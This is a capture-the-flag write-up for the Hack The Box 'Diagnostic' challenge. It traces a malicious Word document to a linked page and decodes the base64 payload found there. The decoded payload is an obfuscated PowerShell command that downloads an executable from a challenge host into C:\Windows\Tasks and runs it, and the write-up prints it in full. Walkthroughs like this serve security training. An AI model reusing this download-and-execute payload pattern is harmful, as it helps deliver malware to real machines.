## WriteUp for the challenge [Diagnostic](https://app.hackthebox.com/challenges/360)

We got the ip and the port of the server, in my case is 206.189.125.80:30566. 
The challenge says that there is a file coming from the address **diagnostic.htb** named *layoffs.doc*.
We also know that the dns has stopped working, than we can search the domain directly from the IP.


We just have to search 206.189.125.80:30566/layoffs.doc.


Using the command `file layoffs.doc` 


we see that this is a zip file: "Zip archive data, at least v2.0 to extract, compression method=store"

`unzip layoffs.doc` gives us interesting files and dirs.

We notice a directory "word" and we go into it. 
Inside this directory we don't know exactly what to search, then we can just grep recursively to see if something is named as the flag.

`find word -exec cat {} \; | grep htb`

We just found that inside the directory "_rels" there is a file named "document.xml.rels" that contains the string 

**Target="http://diagnostic.htb:30566/223_index_style_fancy.html"**

Again, we replace the domain and we search directly http://206.189.125.80:30566:/223_index_style_fancy.html

Once arrived at the page, just watch at the RAW GET requests done at the website.
Looking at the code we see, we get a base64 encoded text

`JHtmYGlsZX0gPSAoIns3fXsxfXs2fXs4fXs1fXszfXsyfXs0fXswfSItZid9LmV4ZScsJ0J7bXNEdF80c19BX3ByMCcsJ0UnLCdyLi4ucycsJzNNc19iNEQnLCdsMycsJ3RvQycsJ0hUJywnMGxfaDRuRCcpCiYoInsxfXsyfXswfXszfSItZid1ZXMnLCdJbnZva2UnLCctV2ViUmVxJywndCcpICgiezJ9ezh9ezB9ezR9ezZ9ezV9ezN9ezF9ezd9Ii1mICc6Ly9hdScsJy5odGIvMicsJ2gnLCdpYycsJ3RvJywnYWdub3N0JywnbWF0aW9uLmRpJywnL24uZXhlJywndHRwcycpIC1PdXRGaWxlICJDOlxXaW5kb3dzXFRhc2tzXCRmaWxlIgomKCgoIns1fXs2fXsyfXs4fXswfXszfXs3fXs0fXsxfSIgLWYnTDlGVGFza3NMOUYnLCdpbGUnLCdvdycsJ0wnLCdmJywnQzonLCdMOUZMOUZXaW5kJywnOUZrekgnLCdzTDlGJykpICAtQ1JlcGxBY2Una3pIJyxbY2hBcl0zNiAtQ1JlcGxBY2UoW2NoQXJdNzYrW2NoQXJdNTcrW2NoQXJdNzApLFtjaEFyXTkyKQo`

Just decode it with CyberChef and the result is

`${file} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)`

At this point we see that something seems like a flag. Looking deeper we see that at the beginning of the line there are numbers that tell us the correct order of the flag.
Then we just reorder the line 

**("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')**


And finally:
FLAG: `HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}`
